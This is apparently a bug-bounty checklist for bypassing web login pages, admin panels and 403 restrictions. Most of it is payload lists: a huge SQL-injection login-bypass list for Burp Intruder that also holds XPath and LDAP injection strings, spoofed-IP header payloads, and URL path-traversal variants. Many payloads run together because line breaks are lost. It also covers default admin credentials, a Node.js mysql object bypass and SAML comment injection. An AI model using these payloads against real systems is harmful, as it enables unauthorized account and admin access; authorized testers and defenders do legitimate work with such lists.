- **==Authentication_Bypass_login_page==**
    
    - [ ] **Admin-Panel**
    
    - **Authentication-bypass** `**sqli**` **burp intruder using**
        
        - first 200 lines as the username and password
        - complete list in the username first and then in the password inputs
        
        ```
        adminpassword1234123456roottoortestguest' or '1'='1' or ''='' or 1]%00' or /* or '' or "a" or '' or 1 or '' or true() or ''or string-length(name(.))<10 or''or contains(name,'adm') or''or contains(.,'adm') or''or position()=2 or'admin' or 'admin' or '1'='2**)(&*)(|(&pwd)*)(|(**))%00admin)(&)pwdadmin)(!(&(|pwd))admin))(|(|1234'-'' ''&''^''*'' or ''-'' or '' '' or ''&'' or ''^'' or ''*'"-"" ""&""^""*"" or ""-"" or "" "" or ""&"" or ""^"" or ""*"or true--" or true--' or true--") or true--') or true--' or 'x'='x') or ('x')=('x')) or (('x'))=(('x" or "x"="x") or ("x")=("x")) or (("x"))=(("xor 1=1or 1=1--or 1=1\#or 1=1/*admin' --admin' \#admin'/*admin' or '1'='1admin' or '1'='1'--admin' or '1'='1'#admin' or '1'='1'/*admin'or 1=1 or ''='admin' or 1=1admin' or 1=1--admin' or 1=1#admin' or 1=1/*admin') or ('1'='1admin') or ('1'='1'--admin') or ('1'='1'#admin') or ('1'='1'/*admin') or '1'='1admin') or '1'='1'--admin') or '1'='1'#admin') or '1'='1'/*1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed0551234 ' AND 1=0 UNION ALL SELECT 'admin', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220admin" --admin" #admin"/*admin" or "1"="1admin" or "1"="1"--admin" or "1"="1"#admin" or "1"="1"/*admin"or 1=1 or ""="admin" or 1=1admin" or 1=1--admin" or 1=1#admin" or 1=1/*admin") or ("1"="1admin") or ("1"="1"--admin") or ("1"="1"#admin") or ("1"="1"/*admin") or "1"="1admin") or "1"="1"--admin") or "1"="1"#admin") or "1"="1"/*1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed0551234 " AND 1=0 UNION ALL SELECT "admin", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220==='' --' #' –'--'/*'#" --" #"/*' and 1='1' and a='aor true' or ''='" or ""="1′) and '1′='1–' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055' AND 1=0 UNION ALL SELECT '', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220" AND 1=0 UNION ALL SELECT "", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220and 1=1and 1=1–' and 'one'='one' and 'one'='one–' group by password having 1=1--' group by userid having 1=1--' group by username having 1=1--like '%'or 0=0 --or 0=0 #or 0=0 –' or         0=0 #' or 0=0 --' or 0=0 #' or 0=0 –" or 0=0 --" or 0=0 #" or 0=0 –%' or '0'='0or 1=1–' or 1=1--' or '1'='1' or '1'='1'--' or '1'='1'/*' or '1'='1'#' or '1′='1' or 1=1' or 1=1 --' or 1=1 –' or 1=1;#' or 1=1/*' or 1=1#' or 1=1–') or '1'='1') or '1'='1--') or '1'='1'--') or '1'='1'/*') or '1'='1'#') or ('1'='1') or ('1'='1--') or ('1'='1'--') or ('1'='1'/*') or ('1'='1'#'or'1=1'or'1=1′" or "1"="1" or "1"="1"--" or "1"="1"/*" or "1"="1"#" or 1=1" or 1=1 --" or 1=1 –" or 1=1--" or 1=1/*" or 1=1#" or 1=1–") or "1"="1") or "1"="1"--") or "1"="1"/*") or "1"="1"#") or ("1"="1") or ("1"="1"--") or ("1"="1"/*") or ("1"="1"#) or '1′='1–) or ('1′='1–' or 1=1 LIMIT 1;#'or 1=1 or ''='"or 1=1 or ""="' or a=a--' or a=a–" or "a"="a") or ("a"="a') or ('a'='a and hi") or ("a"="a' or 'one'='one' or 'one'='one–' or uid like '%' or uname like '%' or userid like '%' or user like '%' or username like '%') or ('x'='x' OR 'x'='x'#;'=' 'or' and '=' 'or'' UNION ALL SELECT 1, @@version;#' UNION ALL SELECT system_user(),user();#' UNION select table_schema,table_name FROM information_Schema.tables;#admin' and substring(password/text(),1,1)='7' and substring(password/text(),1,1)='7"'-- 2"-- 2'='0'&lt;'2"="0"&lt;"2')")')-- 2')/*')#")-- 2") #")/*')-('')&('')^('')*('')=('0')&lt;('2")-("")&("")^("")*("")=("0")&lt;("2'-''-- 2'-''#'-''/*'&''-- 2'&''#'&''/*'^''-- 2'^''#'^''/*'*''-- 2'*''#'*''/*'=''-- 2'=''#'=''/*0'&lt;'2'-- 20'&lt;'2'\#0'&lt;'2'/*"-""-- 2"-""#"-""/*"&""-- 2"&""#"&""/*"^""-- 2"^""#"^""/*"*""-- 2"*""#"*""/*"=""-- 2"=""#"=""/*0"&lt;"2"-- 20"&lt;"2"#0"&lt;"2"/*')-''-- 2')-''#')-''/*')&''-- 2')&''#')&''/*')^''-- 2')^''#')^''/*')*''-- 2')*''#')*''/*')=''-- 2')=''#')=''/*0')&lt;'2'-- 20')&lt;'2'#0')&lt;'2'/*")-""-- 2")-""#")-""/*")&""-- 2")&""#")&""/*")^""-- 2")^""#")^""/*")*""-- 2")*""#")*""/*")=""-- 2")=""#")=""/*0")&lt;"2-- 20")&lt;"2#0")&lt;"2/*'oR'2'oR'2'-- 2'oR'2'#'oR'2'/*'oR'2'oR''oR(2)-- 2'oR(2)#'oR(2)/*'oR(2)oR''oR 2-- 2'oR 2#'oR 2/*'oR 2 oR''oR/**/2-- 2'oR/**/2#'oR/**/2/*'oR/**/2/**/oR'"oR"2"oR"2"-- 2"oR"2"#"oR"2"/*"oR"2"oR""oR(2)-- 2"oR(2)#"oR(2)/*"oR(2)oR""oR 2-- 2"oR 2#"oR 2/*"oR 2 oR""oR/**/2-- 2"oR/**/2#"oR/**/2/*"oR/**/2/**/oR"'oR'2'='2'oR'2'='2'oR''oR'2'='2'-- 2'oR'2'='2'#'oR'2'='2'/*'oR 2=2-- 2'oR 2=2#'oR 2=2/*'oR 2=2 oR''oR/**/2=2-- 2'oR/**/2=2#'oR/**/2=2/*'oR/**/2=2/**/oR''oR(2)=2-- 2'oR(2)=2#'oR(2)=2/*'oR(2)=(2)oR''oR'2'='2' LimIT 1-- 2'oR'2'='2' LimIT 1#'oR'2'='2' LimIT 1/*'oR(2)=(2)LimIT(1)-- 2'oR(2)=(2)LimIT(1)#'oR(2)=(2)LimIT(1)/*"oR"2"="2"oR"2"="2"oR""oR"2"="2"-- 2"oR"2"="2"#"oR"2"="2"/*"oR 2=2-- 2"oR 2=2#"oR 2=2/*"oR 2=2 oR""oR/**/2=2-- 2"oR/**/2=2#"oR/**/2=2/*"oR/**/2=2/**/oR""oR(2)=2-- 2"oR(2)=2#"oR(2)=2/*"oR(2)=(2)oR""oR"2"="2" LimIT 1-- 2"oR"2"="2" LimIT 1#"oR"2"="2" LimIT 1/*"oR(2)=(2)LimIT(1)-- 2"oR(2)=(2)LimIT(1)#"oR(2)=(2)LimIT(1)/*'oR true-- 2'oR true#'oR true/*'oR true oR''oR(true)-- 2'oR(true)#'oR(true)/*'oR(true)oR''oR/**/true-- 2'oR/**/true#'oR/**/true/*'oR/**/true/**/oR'"oR true-- 2"oR true#"oR true/*"oR true oR""oR(true)-- 2"oR(true)#"oR(true)/*"oR(true)oR""oR/**/true-- 2"oR/**/true#"oR/**/true/*"oR/**/true/**/oR"'oR'2'LiKE'2'oR'2'LiKE'2'-- 2'oR'2'LiKE'2'#'oR'2'LiKE'2'/*'oR'2'LiKE'2'oR''oR(2)LiKE(2)-- 2'oR(2)LiKE(2)#'oR(2)LiKE(2)/*'oR(2)LiKE(2)oR'"oR"2"LiKE"2"oR"2"LiKE"2"-- 2"oR"2"LiKE"2"#"oR"2"LiKE"2"/*"oR"2"LiKE"2"oR""oR(2)LiKE(2)-- 2"oR(2)LiKE(2)#"oR(2)LiKE(2)/*"oR(2)LiKE(2)oR"adminadmin'-- 2admin'#admin"-- 2admin"\#ffifdyop' UniON SElecT 1,2-- 2' UniON SElecT 1,2,3-- 2' UniON SElecT 1,2,3,4-- 2' UniON SElecT 1,2,3,4,5-- 2' UniON SElecT 1,2#' UniON SElecT 1,2,3#' UniON SElecT 1,2,3,4#' UniON SElecT 1,2,3,4,5#'UniON(SElecT(1),2)-- 2'UniON(SElecT(1),2,3)-- 2'UniON(SElecT(1),2,3,4)-- 2'UniON(SElecT(1),2,3,4,5)-- 2'UniON(SElecT(1),2)#'UniON(SElecT(1),2,3)#'UniON(SElecT(1),2,3,4)#'UniON(SElecT(1),2,3,4,5)#" UniON SElecT 1,2-- 2" UniON SElecT 1,2,3-- 2" UniON SElecT 1,2,3,4-- 2" UniON SElecT 1,2,3,4,5-- 2" UniON SElecT 1,2#" UniON SElecT 1,2,3#" UniON SElecT 1,2,3,4#" UniON SElecT 1,2,3,4,5#"UniON(SElecT(1),2)-- 2"UniON(SElecT(1),2,3)-- 2"UniON(SElecT(1),2,3,4)-- 2"UniON(SElecT(1),2,3,4,5)-- 2"UniON(SElecT(1),2)#"UniON(SElecT(1),2,3)#"UniON(SElecT(1),2,3,4)#"UniON(SElecT(1),2,3,4,5)#'||'2'||2-- 2'||'2'||''||2#'||2/*'||2||'"||"2"||2-- 2"||"2"||""||2#"||2/*"||2||"'||'2'='2'||'2'='2'||''||2=2-- 2'||2=2#'||2=2/*'||2=2||'"||"2"="2"||"2"="2"||""||2=2-- 2"||2=2#"||2=2/*"||2=2||"'||2=(2)LimIT(1)-- 2'||2=(2)LimIT(1)#'||2=(2)LimIT(1)/*"||2=(2)LimIT(1)-- 2"||2=(2)LimIT(1)#"||2=(2)LimIT(1)/*'||true-- 2'||true#'||true/*'||true||'"||true-- 2"||true#"||true/*"||true||"'||'2'LiKE'2'||'2'LiKE'2'-- 2'||'2'LiKE'2'#'||'2'LiKE'2'/*'||'2'LiKE'2'||''||(2)LiKE(2)-- 2'||(2)LiKE(2)#'||(2)LiKE(2)/*'||(2)LiKE(2)||'"||"2"LiKE"2"||"2"LiKE"2"-- 2"||"2"LiKE"2"#"||"2"LiKE"2"/*"||"2"LiKE"2"||""||(2)LiKE(2)-- 2"||(2)LiKE(2)#"||(2)LiKE(2)/*"||(2)LiKE(2)||"')oR('2')oR'2'-- 2')oR'2'#')oR'2'/*')oR'2'oR('')oR(2)-- 2')oR(2)#')oR(2)/*')oR(2)oR('')oR 2-- 2')oR 2#')oR 2/*')oR 2 oR('')oR/**/2-- 2')oR/**/2#')oR/**/2/*')oR/**/2/**/oR('")oR("2")oR"2"-- 2")oR"2"#")oR"2"/*")oR"2"oR("")oR(2)-- 2")oR(2)#")oR(2)/*")oR(2)oR("")oR 2-- 2")oR 2#")oR 2/*")oR 2 oR("")oR/**/2-- 2")oR/**/2#")oR/**/2/*")oR/**/2/**/oR("')oR'2'=('2')oR'2'='2'oR('')oR'2'='2'-- 2')oR'2'='2'#')oR'2'='2'/*')oR 2=2-- 2')oR 2=2#')oR 2=2/*')oR 2=2 oR('')oR/**/2=2-- 2')oR/**/2=2#')oR/**/2=2/*')oR/**/2=2/**/oR('')oR(2)=2-- 2')oR(2)=2#')oR(2)=2/*')oR(2)=(2)oR('')oR'2'='2' LimIT 1-- 2')oR'2'='2' LimIT 1#')oR'2'='2' LimIT 1/*')oR(2)=(2)LimIT(1)-- 2')oR(2)=(2)LimIT(1)#')oR(2)=(2)LimIT(1)/*")oR"2"=("2")oR"2"="2"oR("")oR"2"="2"-- 2")oR"2"="2"#")oR"2"="2"/*")oR 2=2-- 2")oR 2=2#")oR 2=2/*")oR 2=2 oR("")oR/**/2=2-- 2")oR/**/2=2#")oR/**/2=2/*")oR/**/2=2/**/oR("")oR(2)=2-- 2")oR(2)=2#")oR(2)=2/*")oR(2)=(2)oR("")oR"2"="2" LimIT 1-- 2")oR"2"="2" LimIT 1#")oR"2"="2" LimIT 1/*")oR(2)=(2)LimIT(1)-- 2")oR(2)=(2)LimIT(1)#")oR(2)=(2)LimIT(1)/*')oR true-- 2')oR true#')oR true/*')oR true oR('')oR(true)-- 2')oR(true)#')oR(true)/*')oR(true)oR('')oR/**/true-- 2')oR/**/true#')oR/**/true/*')oR/**/true/**/oR('")oR true-- 2")oR true#")oR true/*")oR true oR("")oR(true)-- 2")oR(true)#")oR(true)/*")oR(true)oR("")oR/**/true-- 2")oR/**/true#")oR/**/true/*")oR/**/true/**/oR("')oR'2'LiKE('2')oR'2'LiKE'2'-- 2')oR'2'LiKE'2'#')oR'2'LiKE'2'/*')oR'2'LiKE'2'oR('')oR(2)LiKE(2)-- 2')oR(2)LiKE(2)#')oR(2)LiKE(2)/*')oR(2)LiKE(2)oR('")oR"2"LiKE("2")oR"2"LiKE"2"-- 2")oR"2"LiKE"2"#")oR"2"LiKE"2"/*")oR"2"LiKE"2"oR("")oR(2)LiKE(2)-- 2")oR(2)LiKE(2)#")oR(2)LiKE(2)/*")oR(2)LiKE(2)oR("admin')-- 2admin')#admin')/*admin")-- 2admin")#') UniON SElecT 1,2-- 2') UniON SElecT 1,2,3-- 2') UniON SElecT 1,2,3,4-- 2') UniON SElecT 1,2,3,4,5-- 2') UniON SElecT 1,2#') UniON SElecT 1,2,3#') UniON SElecT 1,2,3,4#') UniON SElecT 1,2,3,4,5#')UniON(SElecT(1),2)-- 2')UniON(SElecT(1),2,3)-- 2')UniON(SElecT(1),2,3,4)-- 2')UniON(SElecT(1),2,3,4,5)-- 2')UniON(SElecT(1),2)#')UniON(SElecT(1),2,3)#')UniON(SElecT(1),2,3,4)#')UniON(SElecT(1),2,3,4,5)#") UniON SElecT 1,2-- 2") UniON SElecT 1,2,3-- 2") UniON SElecT 1,2,3,4-- 2") UniON SElecT 1,2,3,4,5-- 2") UniON SElecT 1,2#") UniON SElecT 1,2,3#") UniON SElecT 1,2,3,4#") UniON SElecT 1,2,3,4,5#")UniON(SElecT(1),2)-- 2")UniON(SElecT(1),2,3)-- 2")UniON(SElecT(1),2,3,4)-- 2")UniON(SElecT(1),2,3,4,5)-- 2")UniON(SElecT(1),2)#")UniON(SElecT(1),2,3)#")UniON(SElecT(1),2,3,4)#")UniON(SElecT(1),2,3,4,5)#')||('2')||2-- 2')||'2'||('')||2#')||2/*')||2||('")||("2")||2-- 2")||"2"||("")||2#")||2/*")||2||("')||'2'=('2')||'2'='2'||('')||2=2-- 2')||2=2#')||2=2/*')||2=2||('")||"2"=("2")||"2"="2"||("")||2=2-- 2")||2=2#")||2=2/*")||2=2||("')||2=(2)LimIT(1)-- 2')||2=(2)LimIT(1)#')||2=(2)LimIT(1)/*")||2=(2)LimIT(1)-- 2")||2=(2)LimIT(1)#")||2=(2)LimIT(1)/*')||true-- 2')||true#')||true/*')||true||('")||true-- 2")||true#")||true/*")||true||("')||'2'LiKE('2')||'2'LiKE'2'-- 2')||'2'LiKE'2'#')||'2'LiKE'2'/*')||'2'LiKE'2'||('')||(2)LiKE(2)-- 2')||(2)LiKE(2)#')||(2)LiKE(2)/*')||(2)LiKE(2)||('")||"2"LiKE("2")||"2"LiKE"2"-- 2")||"2"LiKE"2"#")||"2"LiKE"2"/*")||"2"LiKE"2"||("")||(2)LiKE(2)-- 2")||(2)LiKE(2)#")||(2)LiKE(2)/*")||(2)LiKE(2)||("' UnION SELeCT 1,2`' UnION SELeCT 1,2,3`' UnION SELeCT 1,2,3,4`' UnION SELeCT 1,2,3,4,5`" UnION SELeCT 1,2`" UnION SELeCT 1,2,3`" UnION SELeCT 1,2,3,4`" UnION SELeCT 1,2,3,4,5`' or 1=1 limit 1 -- -+'="or'Pass1234.Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658'\#Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.')#Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61'#Pass1234.' and 1=0 union select 'admin',sha('Pass1234.Pass1234.' and 1=0 union select 'admin',sha('Pass1234.')#Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658"#Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.")#Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61"#Pass1234." and 1=0 union select "admin",sha("Pass1234.Pass1234." and 1=0 union select "admin",sha("Pass1234.")#%A8%27 Or 1=1-- 2%8C%A8%27 Or 1=1-- 2%bf' Or 1=1 -- 2%A8%27 Or 1-- 2%8C%A8%27 Or 1-- 2%bf' Or 1-- 2%A8%27Or(1)-- 2%8C%A8%27Or(1)-- 2%bf'Or(1)-- 2%A8%27||1-- 2%8C%A8%27||1-- 2%bf'||1-- 2%A8%27) Or 1=1-- 2%8C%A8%27) Or 1=1-- 2%bf') Or 1=1 -- 2%A8%27) Or 1-- 2%8C%A8%27) Or 1-- 2%bf') Or 1-- 2%A8%27)Or(1)-- 2%8C%A8%27)Or(1)-- 2%bf')Or(1)-- 2%A8%27)||1-- 2%8C%A8%27)||1-- 2%bf')||1-- 2
        ```
        
    
    - [ ] hunting on API with JSON format? go to reset password and try to submit 2 emails separated with "\n" as:
    - [ ] [**Password reset broken logic**](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)
    - [ ] [**Broken brute-force protection, IP block**](https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block)
    - [ ] [**Brute-forcing a stay-logged-in cookie**](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)
    - [ ] [**Password brute-force via password change**](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)
    - [ ] if credentials sent in `json` format try send **multiple credentials** in one response
    - [ ] Check if you can **directly access the restricted pages** `**/profile**`
    - [ ] Check to **not send the parameters** (do not send any or only 1)
    - [ ] Check the **PHP comparisons error:** `user[]=a&pwd=b` , `user=a&pwd[]=b` , `user[]=a&pwd[]=b`
    - [ ] **Change content type to json** and send json values (bool true included)
    - [ ] Check `nodejs` potential parsing error (read [**this**](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4)): `password[password]=1`
    - [ ] [**SQL Injection authentication bypass**](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/sql-injection/#authentication-bypass)
    - [ ] [**No SQL Injection authentication bypass**](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/nosql-injection.md#basic-authentication-bypass)
    - [ ] [**XPath Injection authentication bypass**](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xpath-injection.md#authentication-bypass)
    - [ ] [**LDAP Injection authentication bypass**](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ldap-injection.md#login-bypass)
    - [ ] [**Redirects**](https://github.com/M8SZT8/Security-Hub/blob/main/Fuzzing%20Lists/open-redirect.txt)
    - [ ] [**OAUTH-Bypass**](https://github.com/h0tak88r/Security-Hub/blob/main/Bypass%20Authentication/OAUTH-Bypass/)
    - [ ] CAPTCHA Bypass
    - [ ] Lack of Password Confirmation
    - [ ] Lack of Verification Email
    - [ ] Weak Password Policy
    - [ ] Weak Registration Implementation over HTTP
    - [ ] Broken Authentication Session Token Bug
    - [ ] Broken Authentication and Session Management
    
- ==**403 Bypass**==
    
    - [ ] Tools
    
    ```
    <https://github.com/iamj0ker/bypass-403><https://github.com/channyein1337/403-bypass/blob/main/403-bypass.py><https://github.com/nico989/B1pass3r><https://github.com/Dheerajmadhukar/4-ZERO-3>
    ```
    
    - [ ] bypass by fuzz or brute force
    
    ```
    you can use dirsearch tool or discovery content path
    ```
    
    - [ ] bypass by waybachurl
    
    ```
    search in wayback about this subdomain you can find any important path
    ```
    
    - [ ] bypass by header names
    
    ```
    Base-UrlClient-IPHttp-UrlProxy-HostProxy-UrlReal-IpRedirectRefererReferrerReffererRequest-UriUriUrlX-Client-IPX-Custom-IP-AuthorizationX-Forward-ForX-Forwarded-ByX-Forwarded-For-OriginalX-Forwarded-ForX-Forwarded-HostX-Forwarded-PortX-Forwarded-PortX-Forwarded-PortX-Forwarded-PortX-Forwarded-PortX-Forwarded-SchemeX-Forwarded-SchemeX-Forwarded-ServerX-ForwardedX-Forwarder-ForX-HostX-Http-DestinationurlX-Http-Host-OverrideX-Original-Remote-AddrX-Original-UrlX-Originating-IPX-Proxy-UrlX-Real-IpX-Remote-AddrX-Remote-IPX-Rewrite-UrlX-True-IP
    ```
    
    - [ ] bypass by header payloads
    
    ```
    Base-Url: 127.0.0.1Client-IP: 127.0.0.1Http-Url: 127.0.0.1Proxy-Host: 127.0.0.1Proxy-Url: 127.0.0.1Real-Ip: 127.0.0.1Redirect: 127.0.0.1Referer: 127.0.0.1Referrer: 127.0.0.1Refferer: 127.0.0.1Request-Uri: 127.0.0.1Uri: 127.0.0.1Url: 127.0.0.1X-Client-IP: 127.0.0.1X-Custom-IP-Authorization: 127.0.0.1X-Forward-For: 127.0.0.1X-Forwarded-By: 127.0.0.1X-Forwarded-For-Original: 127.0.0.1X-Forwarded-For: 127.0.0.1X-Forwarded-Host: 127.0.0.1X-Forwarded-Port: 443X-Forwarded-Port: 4443X-Forwarded-Port: 80X-Forwarded-Port: 8080X-Forwarded-Port: 8443X-Forwarded-Scheme: httpX-Forwarded-Scheme: httpsX-Forwarded-Server: 127.0.0.1X-Forwarded: 127.0.0.1X-Forwarder-For: 127.0.0.1X-Host: 127.0.0.1X-Http-Destinationurl: 127.0.0.1X-Http-Host-Override: 127.0.0.1X-Original-Remote-Addr: 127.0.0.1X-Original-Url: 127.0.0.1X-Originating-IP: 127.0.0.1X-Proxy-Url: 127.0.0.1X-Real-Ip: 127.0.0.1X-Remote-Addr: 127.0.0.1X-Remote-IP: 127.0.0.1X-Rewrite-Url: 127.0.0.1X-True-IP: 127.0.0.1
    ```
    
    - [ ] bypass by url payloads
    
    ```
    ##?%09%09%3b%09..%09;%20%23%23%3f%252f%252f%252f/%2e%2e%2e%2e/%2f%2f%20%23%2f%23%2f%2f%2f%3b%2f%2f%3b%2f%2f%2f%3f%2f%3f/%2f/%2f;?%2f?;%3b%3b%09%3b%2f%2e%2e%3b%2f%2e%2e%2f%2e%2e%2f%2f%3b%2f%2e.%3b%2f..%3b/%2e%2e/..%2f%2f%3b/%2e.%3b/%2f%2f../%3b/..%3b//%2f../%3f%23%3f%3f%3f.php....%00/..%00/;..%00;/..%09..%0d/..%0d/;..%0d;/..%5c/..%ff/..%ff/;..%ff;/../..;%00/..;%0d/..;%ff/..;\\..;\\;..\\..\\;.html.json//#/%20/%20#/%20%23/%23/%252e%252e%252f//%252e%252e%253b//%252e%252f//%252e%253b//%252e//%252f/%2e%2e/%2e%2e%2f//%2e%2e%3b//%2e%2e//%2e%2f//%2e%3b//%2e%3b///%2e//%2e///%2f/%3b//../..%2f/..%2f..%2f/..%2f..%2f..%2f/..//../..//../../..//../../..///../..///../..//..//../..;//.././..//../.;/..//..///..//..//..//../..//..//..;//../;//../;/..//..;%2f/..;%2f..;%2f/..;%2f..;%2f..;%2f/..;//..;/..//..;/..;//..;///..;//..//..;//..;//..;/;//..;/;/..;//.//.///.;//.;//////..//../..///..;//.///.;////..///..////../////..;///..;////..;////;//;//;///;?/;x/;x//?/?;/x/..//x/..///x/../;//x/..;//x/..;///x/..;/;//x//..//x//..;//x/;/..//x/;/..;/;;%09;%09..;%09..;;%09;;%2F..;%2f%2e%2e;%2f%2e%2e%2f%2e%2e%2f%2f;%2f%2f/../;%2f..;%2f..%2f%2e%2e%2f%2f;%2f..%2f..%2f%2f;%2f..%2f/;%2f..%2f/..%2f;%2f..%2f/../;%2f../%2f..%2f;%2f../%2f../;%2f..//..%2f;%2f..//../;%2f..///;%2f..///;;%2f..//;/;%2f..//;/;;%2f../;//;%2f../;/;/;%2f../;/;/;;%2f..;///;%2f..;//;/;%2f..;/;//;%2f/%2f../;%2f//..%2f;%2f//../;%2f//..;/;%2f/;/../;%2f/;/..;/;%2f;//../;%2f;/;/..;/;/%2e%2e;/%2e%2e%2f%2f;/%2e%2e%2f/;/%2e%2e/;/%2e.;/%2f%2f../;/%2f/..%2f;/%2f/../;/.%2e;/.%2e/%2e%2e/%2f;/..;/..%2f;/..%2f%2f../;/..%2f..%2f;/..%2f/;/..%2f//;/../;/../%2f/;/../../;/../..//;/.././../;/../.;/../;/..//;/..//%2e%2e/;/..//%2f;/..//../;/..///;/../;/;/../;/../;/..;;/.;.;//%2f../;//..;//../../;///..;///../;///..//;?;x;x/;x;??#?.php?;??////%2f///%2f%2f/%2f%2f%2f%2f%2f//
    ```
    
- ==**Admin Panel**==
    
    - [ ] [default credentials](https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#default-credentials)
    
    ```
    admin:adminadmin:passwordauthor:authoradministrator:passwordadmin123:passwordusername:pass12345and many of defualt credentials
    ```
    
    - [ ] Bypass by SQL Injection
    
    ```
    inject username or paswword with a lot of payloads:=> error based=> time  based
    ```
    
    - [ ] By Cross Site Scripting(XSS)
    
    ```
    inject username or password with xss payloads:=> url encode=> base64 encode
    ```
    
    - [ ] By Manipulating the Response
    
    ```
    change the status of response from200 => 302failed => successerror => success403 => 200403 => 302false => true
    ```
    
    - [ ] Bypass by Brute Force Attack
    
    ```
    <https://medium.com/@uttamgupta_/1-how-to-perform-login-brute-force-using-burp-suite-9d06b67fb53d><https://medium.com/@uttamgupta_/broken-brute-force-protection-ip-block-aae835895a74>
    ```
    
    - [ ] Bypass by Directory Fuzzing Attack
    
    ```
    use this list to fuzz<https://github.com/six2dez/OneListForAll>
    ```
    
    - [ ] By Removing Parameter in Request
    
    ```
    When you enter wrong credentials the site shows error like username and password is incorrect/does not match,password is incorrect for this username etc,this type of response is shown by the site so can try this method Huh.First you intercept the request and remove the password parameter in the request and forward the request.Then the server sees that the username is available and logs you in to the site.This problem occurs when the server does not analyze the request properly
    ```
    
    - [ ] check js file in login page
    
    ```
    it can contain an important path or username and password
    ```
    
    - [ ] Check for comments inside the page
    
    ```
    it can contain a important info  such as username and password
    ```
    
    - [ ] Check the PHP comparisons error:
    
    ```
    user[]=a&pwd=b , user=a&pwd[]=b , user[]=a&pwd[]=b
    ```
    
    - [ ] Change content type to json and send json values (bool true included)
    
    ```
    If you get a response saying that POST is not supported you can try to send the JSON in the body but with a GET request with Content-Type: application/json
    ```
    
    - [ ] Check nodejs potential parsing error [check this article](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4)
    
    ```
    1. Nodejs will transform that payload to a query similar to the following one: SELECT id, username, left(password, 8) AS snipped_password, email FROM accounts WHERE username='admin' AND`` ``password=password=1; which makes the password bit to be always true.2. If you can send a JSON object you can send "password":{"password": 1} to bypass the login.3. Remember that to bypass this login you still need to know and send a valid username.4. Adding "stringifyObjects":true option when calling mysql.createConnection will eventually block all unexpected behaviours when Object is passed in the parameter.
    ```
    
    - [ ] No SQL Injection
    
    ```
    <https://book.hacktricks.xyz/pentesting-web/nosql-injection\#basic-authentication-bypass>
    ```
    
    - [ ] XPath Injection
    
    ```
    ' or '1'='1' or ''='' or 1]%00' or /* or '' or "a" or '' or 1 or '' or true() or ''or string-length(name(.))<10 or''or contains(name,'adm') or''or contains(.,'adm') or''or position()=2 or'admin' or 'admin' or '1'='2
    ```
    
    - [ ] LDAP Injection
    
    ```
    **)(&*)(|(&pwd)*)(|(**))%00admin)(&)pwdadmin)(!(&(|pwd))admin))(|(|
    ```
    
    - [ ] [Authorization Bypass](https://www.securify.nl/en/advisory/authorization-bypass-in-infinitewp-admin-panel/)
    
- SAML Authentication Bypass
    
    - SAML Authorization Bypass - Scenario 1
        
        - A user can tamper the SAML response further send to the service provider (step 5 in SAML Workflow) and replace the values of the assertions released by IDP such as username/email.
        - A weak SAML implementation would not verify the signature and  
            thus allow an attacker to access the account of another user
        
    - SAML Authorization Bypass - Scenario 2
        
        - Service Provider validates the SAML response (XML Signature) to identify the user.
        - Canonicalization engine ignores comments and whitespaces while creating a signature.
        - The XML parser returns the last child node
        
    
    - In SAML Based authentication the user provides credentials at a login interface, based on which the identity provider provides (IDP) a SAML  
        response containing assertions with NameID attributes containing user information and signed message in XML.
    - The XML document (base64 encoded) is further passed on to the service the user needs to access. The service provider (SP) validates  
        the provided XML and allows access to user based on the validity
    
    ## SAML Workflow
    
    ### **XML Canonicalization**
    
    - An XML canonicalization transform is employed while signing the ML document to produce the identical signature for logically or semantically similar documents
        
    - XML Parsing
    - XML parsing issues
    - An XML parser might parse it into three components:
        
        ○ text: notsosecure  
        ○ comment: <!-- this is a comment -->  
        ○ text: user@webhacklab.com
        
    
    This might allow you to access the account of the user `user@webhacklab.com`, instead of the user  
    `notsosecureuser@webhacklab.com` if the XML parser returns the last child node
    
- ==**Session Based Bugs**==
    
    ### Old Session Does Not Expire After Password Change:
    
    ```
          1.create An account On Your Target Site      2.Login Into Two Browser With Same Account(Chrome, FireFox.You Can Use Incognito Mode As well)      3.Change You Password In Chrome, On Seccessfull Password Change Referesh Your Logged in Account In FireFox/Incognito Mode.      4.If you'r still logged in Then This Is a Bug
    ```
    
